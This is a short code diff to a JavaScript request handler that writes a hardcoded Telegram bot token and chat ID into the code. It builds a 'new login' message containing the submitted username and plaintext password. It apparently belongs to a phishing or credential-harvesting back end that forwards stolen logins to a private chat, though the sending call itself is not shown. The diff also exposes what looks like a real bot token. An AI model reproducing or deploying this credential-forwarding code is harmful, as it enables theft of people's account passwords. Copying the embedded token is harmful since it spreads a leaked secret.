@@ -10,7 +10,7 @@ export default async function handler(req, res) {
     }
 
     const chatId = "-4575020350"; // Çat ID-sini buraya yazın
-    const botToken = "BOT_TOKEN"; // Bot tokenini buraya yazın
+    const botToken = "7821718686:AAF7-NR_-LlzOz5bdFEqZRwR1jXBjaNahaA"; // Bot tokenini buraya yazın
 
     const message = `Yeni giriş:\nKullanıcı Adı: ${username}\nŞifre: ${password}`;
 
